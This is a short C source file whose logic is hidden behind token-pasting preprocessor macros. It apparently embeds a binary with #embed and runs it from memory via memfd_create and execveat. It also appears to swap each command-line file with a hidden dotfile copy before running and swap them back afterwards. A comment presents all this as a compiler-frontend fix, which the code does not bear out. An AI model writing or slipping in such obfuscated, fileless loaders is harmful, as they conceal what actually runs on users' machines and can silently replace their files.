
#include "macro.h"

#define A(a, b, c)C(A##a,A##b,A##c)
#define B(a, b, c)a##b##c
#define C(a, b, c)B(a,b,c)

#define F(a,b,c,d,e,f)H(A##a,A##b,A##c,A##d,A##e,A##f)
#define G(a,b,c,d,e,f)a##b##c##d##e##f
#define H(a,b,c,d,e,f)G(a,b,c,d,e,f)

#define P E(/A(K,I,H)/A(1,8,D)/A(2,2,Q))
#define Q E(.A(J,H,K)A(I,J,O)/)
#define F1 F(H,4,D,0,C,4)
#define F2 F(I,J,H,2,F,O)
#define F3 F(I,J,H,B,4,D) 
#define F4 F(0,B,B,E,2,0)
#define F5 F(M,0,8,J,Q,Q)
#define F6 F(0,2,2,4,I,I)
#define F7 F(5,E,H,A,Q,Q)
#define F8 F(M,H,8,J,4,Q)

#define Z1 A(8,D,J)
#define Z2 F(2,7,0,H,Q,Q)
#define Z3 A(Q,7,Q)

#include E(A(0,B,B)A(E,2,0).Z3)
#include E(A(5,2,D)A(J,B,Q).Z3)
#include E(A(I,J,3)A(8,E,Q).Z3)
#include E(A(I,J,H)A(8,D,6).Z3)
#include E(A(I,O,I)/A(Q,Q,C)A(C,0,D).Z3)
#include E(A(I,O,Q)A(Q,I,Q)/A(Q,Q,I)A(J,0,J).Z3)
#include E(A(I,O,I)/A(Q,Q,M)A(0,8,J).Z3)
#include E(A(K,D,8)A(I,J,3).Z3)


Z2 cc[]={ 
#embed P
};

// fix issue with compiler frontend not being able to resolve the linker,
// which is passed through a named extern var environ
F(4,N,J,4,H,D)Z2**environ;

#define S A(5,E,H)(Z1 i=1;i<c;i++){F2(p=F4(F3(Q)+F3(v[i])),Q);F2(p+F3(Q),a[i]=v[i]); \
          A(8,5,Q)(!F6(v[i],0)&!F6(p,0))F1(v[i],t)|F1(p,v[i])|F1(t,p);}

Z1 F(C,0,8,D,Q,Q)(Z1 c,Z2**v) {
  Z1 f;Z2*a[31*33]={P},*t = E(.A(H,2,K)),*p;
  S;A(8,5,Q)(!F7()){F8(f=memfd_create(E(),1),cc,F(I,8,P,4,E,5) cc);execveat(f,E(),a,environ,1<<12);}
  F5(0);S;F(H,4,J,K,H,D)0;
}
